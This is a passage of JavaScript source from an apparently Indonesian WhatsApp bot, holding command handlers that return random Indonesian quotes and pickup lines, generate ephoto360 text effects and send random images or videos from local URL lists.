    "Punya kalimat sendiri & mau ditambahin? chat *.owner*"
]
    let bacotan = pickRandom(galau)
  reply(bacotan)
}
break
//=========================================\\======
case 'quotesgombal': {
    function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const gombal = [
    "Hal yang paling aku suka yaitu ngemil, namun tau gak ngemil apa yang paling aku suka? ngemilikin kamu sepenuhnya.",
    "Seandainya sekarang adalah tanggal 28 oktober 1928, aku akan ubah naskah sumpah pemuda menjadi sumpah aku cinta kamu.",
    "Aku gak pernah merasakan ketakutan sedikit pun ketika berada didekat kamu, karena kamulah kekuatanku.",
    "Kamu tahu apa persamaan rasa sayangku ke kamu dengan matahari? Persamaannya adalah sama-sama terbit setiap hari dan hanya akan berakhir sampai kiamat.",
    "Kalau bus kota jauh dekat ongkosnya sama, tapi cinta ini dekat-dekat makin saling cinta.",
    "Kalausaja aku harus mengorbankan semua kebahagiaanku hanya untuk sekedar membuat kamu tertawa. Aku rela.",
    "Anjing menggonggong kafilah berlalu, tiap hari bengong mikirin kamu melulu.",
    "Kalau aku jadi wakil rakyat kayaknya bakalan gagal deh. Gimana aku mau mikiran rakyat kalau yang ada dipikiran aku itu cuman ada kamu.",
    "denganambah satu sama dengan dua. Aku sama kamu sama dengan saling cinta.",
    "Kalo kita beda kartu GSM, itu gak masalah asalkan nantinya nama kita berdua ada di kartu Keluarga yang sama.",
    "Masalah yang selalu sulit untukku membuat mu mencintai ku, tapi lebih sulit memaksa hatiku untuk berhenti memikirkan dirimu.",
    "Aku harap kamu tidak menanyakan hal terindah yang pernah singgah di kehidupanku, karena jawaban nya adalah kamu.",
    "Hal yang paling aku suka yaitu ngemil, namun tau gak ngemil apa yang paling aku suka? ngemilikin kamu sepenuhnya.",
    "seandainyaa sekarang adalah tanggal 28 oktober 1928, aku akan ubah naskah sumpah pemuda menjadi sumpah aku cinta kamu.",
    "kuu gak pernah merasakan ketakutan sedikit pun ketika berada didekat kamu, karena kamulah kekuatanku.",
    "kamuu tahu apa persamaan rasa sayangku ke kamu dengan matahari? Persamaannya adalah sama-sama terbit setiap hari dan hanya akan berakhir sampai kiamat.",
    "Kalau bus kota jauh dekat ongkosnya sama, tapi cinta ini dekat-dekat makin saling cinta.",
    "jikaa saja aku harus mengorbankan semua kebahagiaanku hanya untuk sekedar membuat kamu tertawa. Aku rela.",
    "Anjing menggonggong kafilah berlalu, tiap hari bengong mikirin kamu melulu.",
    "Kalau aku jadi wakil rakyat kayaknya bakalan gagal deh. Gimana aku mau mikiran rakyat kalau yang ada dipikiran aku itu cuman ada kamu.",
    "atuu tambah satu sama dengan dua. Aku sama kamu sama dengan saling cinta,.",
    "aloo kita beda kartu GSM, itu gak masalah asalkan nantinya nama kita berdua ada di kartu Keluarga yang sama.",
    "Masalah yang selalu sulit untukku membuat mu mencintai ku, tapi lebih sulit memaksa hatiku untuk berhenti memikirkan dirimu.",
    "Aku tak pernah berjanji untuk sebuah perasaan, namun aku berusaha berjanji untuk sebuah kesetiaan.",
    "Aku sangat berharap kamu tau, kalau aku tidak pernah menyesali cintaku untuk mu, karena bagiku memiliki kamu sudah cukup bagi ku.",
    "Jangankan memilikimu, mendengar kamu kentut aja aku sudah bahagia.",
    "Aku mohon jangan jalan-jalan terus di pikiranku, duduk yang manis di hatiku saja.",
    "Berulang tahun memang indah, namun bagiku yang lebih indah jika berulang kali bersamamu.",
    "Napas aku kok sesek banget ya?, karena separuh nafasku ada di kamu.",
    "Jika ada seseorang lebih memilih pergi meninggalkan kamu, jangan pernah memohon padanya untuk tetap bertahan. Karena jika dia cinta, dia tak akan mau pergi.",
    "jangann diam aja dong, memang diam itu emas, tapi ketahuilah suara kamu itu seperti berlian.",
    "Kesasar itu serasa rugi banget, namun aku nggak merasa rugi karena cintaku sudah Biasanya orang yang lagi nyasar itu rugi ya, tapi tau gak? Aku gak merasa rugi sebab cintaku sudah nyasar ke hati bidadari.",
    "Ada 3 hal yang paling aku sukai di dunia ini, yaitu Matahari, Bulan dan Kamu. Matahari untuk siang hari, Bulan untuk malam hari dan Kamu untuk selamanya dihatiku.",
    "Sayang, kamu itu seperti garam di lautan, tidak terlihat namun akan selalu ada untuk selamanya.",
    "kuu gak perlu wanita yang sholeha, tapi bagaimana menuntun wanita yang aku cintai menjadi seorang yang sholehah.",
    "Aku tidak minta bintang atau bulan kepadamu. Cukup temani aku selamanya di bawah cahayanya.",
    "Akuana kalo kita berdua jadi komplotan penjahat: Aku mencuri hatimu, dan kamu mencuri hatiku?",
    "Aku gak perlu wanita yang cantik, tapi bagaimana aku menyanjung wanita yang aku cintai seperti wanita yang paling cantik di bumi ini.",
    "Aku pengen bersamamu cuma pada dua waktu: SEKARANG dan SELAMANYA.",
    "Akuu tuh bikin aku ga bisa tidur tau ga?",
    "Soalnya kamu selalu ada dibayang-bayang aku terus.",
    "Jika aku bisa jadi bagian dari dirimu,aku mau jadi air matamu,yang tersimpan di hatimu, lahir dari matamu, hidup di pipimu, dan mati di bibirmu.",
    "Papa kamu pasti kerja di apotik ya? | kenapa bang? | karena cuma kamu obat sakit hatiku.",
    "akuu selalu berusaha tak menangis karenamu, karena setiap butir yang jatuh, hanya makin mengingatkan, betapa aku tak bisa melepaskanmu.",
    "mauu nanya jalan nih. Jalan ke hatimu lewat mana ya?",
    "Andai sebuah bintang akan jatuh setiap kali aku mengingatmu, bulan pasti protes. Soalnya dia bakal sendirian di angkasa.",
    "Andai kamu gawang aku bolanya. Aku rela ditendang orang-orang demi aku dapat bersamamu,",
    "Dingin malam ini menusuk tulang. Kesendirian adalah kesepian. Maukah kau jadi selimut penghangat diriku?",
    "Keindahan Borobudur keajaiban dunia, keindahan kamu keajaiban cinta.",
    "Aku ingin mengaku dosa. Jangan pernah marah ya. Maafkan sebelumnya. Tadi malam aku mimpiin kamu jadi pacarku. Setelah bangun, akankah mimpiku jadi nyata?",
    "Kalau nggak sih aku bilang aku cinta kamu hari ini? Kalau besok gimana? Besok lusa? Besoknya besok lusa? Gimana kalau selamanya?",
    "Orangtuamu pengrajin bantal yah? Karena terasa nyaman jika di dekatmu.",
    "Jika malam adalah jeruji gelap yang menjadi sangkar, saya ingin terjebak selamanya di sana bersamamu.",
    "Sekarang aku gendutan gak sih? Kamu tau gak kenapa ? Soalnya kamu sudah mengembangkan cinta yang banyak di hatiku.",
    "Di atas langit masih ada langit. Di bawah langit masih ada aku yang mencintai kamu.",
    "Tau tidak kenapa malam ini tidak ada bintang? Soalnya bintangnya pindah semua ke matamu?",
    "Aku mencintaimu! Jika kamu benci aku, panah saja diriku. Tapi jangan di hatiku ya, karena di situ kamu berada.",
    "Bapak kamu pasti seorang astronot? | kok tau? | Soalnya aku melihat banyak bintang di matamu.",
    "Bapak kamu dosen ya? | kok tau? | karena nilai kamu A+ di hatiku.",
    "Kamu pasti kuliah di seni pahat ya? | kok tau sih? | Soalnya kamu pintar sekali memahat namamu di hatiku.",
    "Ya Tuhan, jika dia jodohku, menangkanlah tender pembangunan proyek menara cintaku di hatinya.",
    "Kamu mantan pencuri ya? | kok tau? | Abisnya kamu mencuri hatiku sih!",
    "Cowok : Aku suka senyum-senyum sendiri lho. | Cewek : Hah .. Gila Ya | Cowok : Nggak. Aku sedang mikirin kamu.",
    "Setiap malam aku berjalan-jalan di suatu tempat. Kamu tau di mana itu ? | gatau, emang dimana? | Di hatimu.",
    "Kamu pake Telkomesl ya? Karena sinyal-sinyal cintamu sangat kuat sampai ke hatiku.",
    "Kamu tahu gak sih? AKu tuh capek banget. Capek nahan kangen terus sama kamu.",
    "katanyaa kalau sering hujan itu bisa membuat seseorang terhanyut, kalau aku sekarang sedang terhanyut di dalam cintamu.",
    "Aku harap kamu jangan pergi lagi ya? karena, bila aku berpisah dengamu sedetik saja bagaikan 1000 tahun rasanya.",
    "Aku sih gak butuh week end, yang aku butuhkan hanyalah love you till the end.",
    "Emak kamu tukang Gado gado ya?, kok tau sih?, Pantesan saja kamu telah mencampur adukan perasaanku",
    "Walau hari ini cerah, tetapi tanpa kamu disisiku sama saja berselimutkan awan gelap di hati ini",
    "Kamu ngizinin aku kangen sehari berapa kali neng? Abang takut over dosis.",
    "cintaa aku ke kamu tuh bagaikan hutang, awalnya kecil, lama-lama didiemin malah tambah gede.",
    "Berulang tahun adalah hari yang indah. Tapih akin lebih indah kalo udah berulang-ulang kali bersama kamu."
]
let bacotan = pickRandom(gombal)
  reply(bacotan)

}
break
//=========================================\\======
case 'quoteshacker': {
  function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const heker = [
  "Dear kamu yang tertulis di halaman defacementku, Kapan jadi pacarku?",
  "Aku rela ko jadi Processor yg kepanasan, asalkan kmu yg jadi heatsink'y yg setiap saat bisa mendinginkan ku.",
  "Gak usah nyari celah xss deh, karena ketika kamu ngeklik hatiku udah muncul pop up namamu.",
  "berharap setelah aku berhasil login di hati kamu ga akan ada tombol logout, dan sessionku ga bakal pernah expired.",
  "Masa aku harus pake teknik symlink bypass buat buka-buka folder hatimu yg open_basedir enabled.",
  "Diriku dan Dirimu itu ibarat PHP dan MySQL yang belum terkoneksi.",
  "Jangan cuma bisa inject hatinya,tapi harus bisa patchnya juga. Biar tidak selingkuh sama hacker lain.",
  "Aku memang programmer PHP,tapi aku nggak akan php-in kamu kok.",
  "Eneeeng. | Apache? | Km wanita yg paling Unix yg pernah aku kenal |",
  "Sayang, capslock kamu nyala ya? | ngga, kenapa emangnya? | soalnya nama kamu ketulis gede bgt di hati aku | zzz! smile",
  "Aku deketin kamu cuma untuk redirect ke hati temenmu.",
  "Domain aja bisa parkir, masa cintaku ga bisa parkir dihatimu?",
  "Aku boleh jadi pacarmu? | 400(Bad Request) | Aku cium boleh? | 401(Authorization Required) | Aku buka bajumu yah | 402(Payment Required) sad",
  "kamu tau ga beda'y kamu sama sintax PHP, kalo sintax PHP itu susah di hafalin kalo kamu itu susah di lupain",
  "Kamu dulu sekolah SMK ambil kejuruan apa? | Teknik Komputer Jaringan | Terus sekarang bisa apa aja? | Menjaring hatimu lewat komputerku | biggrin",
  "Jika cinta itu Array, maka,cintaku padamu tak pernah empty jika di unset().",
  "SQLI ( Structured Query Love Injection )",
  "aku ingin kamu rm -rf kan semua mantan di otak mu,akulah root hati kamu",
  "Senyumu bagaikan cooler yang menyejukan hatiku ketika sedang overclock.",
  "kamu adalah terminalku, dimana aku menghabiskan waktuku untuk mengetikan beribu baris kode cinta untukmu smile",
  "Aku seneng nongkrong di zone-h, karena disanalah aku arsipkan beberapa website yang ada foto kamunya.",
  "hatiku ibarat vps hanya untukmu saja bukan shared hosting yg bisa tumpuk berbagai domain cinta.",
  "Aku bukanlah VNC Server Tanpa Authentication yg bisa kamu pantau kapan saja.",
  "Jangan men-dualboot-kan hatiku kepadamu.",
  "cintaku kan ku Ctrl+A lalu kan ku Ctrl+C dan kan ku Ctrl+V tepat di folder system hatimu.",
  "KDE kalah Cantiknya, GNOME kalah Simplenya, FluxBox kalah Ringannya, pokonya Semua DE itu Kalah Sama Kamu.",
  "Cintamu bagaikan TeamViewer yang selalu mengendalikan hatiku",
  "cinta kita tak akan bisa dipisahkan walau setebal apapun itu firewall...!!"
]

let bacotan = pickRandom(heker)
  reply(bacotan)
}
break
//=========================================\\======
case 'quotesbijak':{
  function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const quotes = [
"Keyakinan merupakan suatu pengetahuan di dalam hati, jauh tak terjangkau oleh bukti.",
"Rasa bahagia dan tak bahagia bukan berasal dari apa yang kamu miliki, bukan pula berasal dari siapa diri kamu, atau apa yang kamu kerjakan. Bahagia dan tak bahagia berasal dari pikiran kamu.",
"Sakit dalam perjuangan itu hanya sementara. Bisa jadi kamu rasakan dalam semenit, sejam, sehari, atau setahun. Namun jika menyerah, rasa sakit itu akan terasa selamanya.",
"Hanya seseorang yang takut yang bisa bertindak berani. Tanpa rasa takut itu tidak ada apapun yang bisa disebut berani.",
"Jadilah diri kamu sendiri. Siapa lagi yang bisa melakukannya lebih baik ketimbang diri kamu sendiri?",
"Kesempatan kamu untuk sukses di setiap kondisi selalu dapat diukur oleh seberapa besar kepercayaan kamu pada diri sendiri.",
"Kebanggaan kita yang terbesar adalah bukan tidak pernah gagal, tetapi bangkit kembali setiap kali kita jatuh.",
"Suatu pekerjaan yang paling tak kunjung bisa diselesaikan adalah pekerjaan yang tak kunjung pernah dimulai.",
"Pikiran kamu bagaikan api yang perlu dinyalakan, bukan bejana yang menanti untuk diisi.",
"Kejujuran adalah batu penjuru dari segala kesuksesan. Pengakuan adalah motivasi terkuat. Bahkan kritik dapat membangun rasa percaya diri saat disisipkan di antara pujian.",
"Segala sesuatu memiliki kesudahan, yang sudah berakhir biarlah berlalu dan yakinlah semua akan baik-baik saja.",
"Setiap detik sangatlah berharga karena waktu mengetahui banyak hal, termasuk rahasia hati.",
"Jika kamu tak menemukan buku yang kamu cari di rak, maka tulislah sendiri.",
"Jika hatimu banyak merasakan sakit, maka belajarlah dari rasa sakit itu untuk tidak memberikan rasa sakit pada orang lain.",
"Hidup tak selamanya tentang pacar.",
"Rumah bukan hanya sebuah tempat, tetapi itu adalah perasaan.",
"Pilih mana: Orang yang memimpikan kesuksesan atau orang yang membuatnya menjadi kenyataan?",
"Kamu mungkin tidak bisa menyiram bunga yang sudah layu dan berharap ia akan mekar kembali, tapi kamu bisa menanam bunga yang baru dengan harapan yang lebih baik dari sebelumnya.",
"Bukan bahagia yang menjadikan kita bersyukur, tetapi dengan bersyukurlah yang akan menjadikan hidup kita bahagia.",
"Aku memang diam. Tapi aku tidak buta.",
]
let bacotan = pickRandom(quotes)
  reply(bacotan)
}
break//==================================================================






































//==================================================================

















































//case ephoto 360
case 'style': case 'styletext': {
		let { styletext } = require('./lib/scraper')
		if (!text) return replynano('Enter Query text!')
let anu = await styletext(text)
let teks = `Style Text From ${text}\n\n`
for (let i of anu) {
teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`
}
replynano(teks)
	    }
break
case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{

if (!q) return replynano(`Example : ${prefix+command} NanoBotz`) 
reply(mess.wait)
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
NanoBotz.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
}
break





































//case random video
case 'tiktokgirl':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var asupan = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
NanoBotz.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokghea':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var gheayubi = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
NanoBotz.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokbocil':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var bocil = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
NanoBotz.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknukhty':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ukhty = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
NanoBotz.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoksantuy':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var santuy = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
NanoBotz.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokkayes':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var kayes = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
NanoBotz.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokpanrika':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var rikagusriani = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
NanoBotz.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknotnot':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break




































//case random foto
case 'chinese':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'hijab':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'indo':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'japanese':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'korean':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'malay':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomgirl':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomboy':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'thai':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'vietnamese':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'aesthetic':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/aesthetic.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'antiwork':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/antiwork.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'blackpink':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/blackpink.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'bike':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/bike.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'boneka':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/boneka.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cosplay':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/cosplay.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cat':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/cat.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'doggo':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/doggo.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'justina':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/justina.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kayes':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/kayes.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kpop':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/kpop.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'notnot':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/notnot.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'car':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/car.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'couplepic':case 'ppcp':case 'couplepicture':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/ppcouple.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'profilepic':  case 'profilepicture':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/profile.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'pubg':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/pubg.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'rose':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/rose.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ryujin':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/ryujin.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzangboy':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/ulzzangboy.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzanggirl':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/ulzzanggirl.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallpaperphone': case 'wallphone':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/wallhp.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'animewallpaper2': case 'animewall2': {
if (!args.join(" ")) return replynano("What wallpaper are you looking for??")
		let { wallpaper } = require('./lib/scraperW')
anu = await wallpaper(args)
result = anu[Math.floor(Math.random() * anu.length)]
NanoBotz.sendMessage(m.chat, { caption: `Title : ${result.title}\nCategory : ${result.type}\nDetail : ${result.source}\nMedia Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] } } , { quoted: m })
            }

            break





































//case other
case 'id':{
  replynano(from)
 }
break
break

case 'delsampah':{
	let path = require('path');
	let directoryPath = path.join();
	fs.readdir(directoryPath, async function (err, files) {
	if (err) {
	console.log('Unable to scan directory: ' + err);
	return reply('Unable to scan directory: ' + err);
	 } 
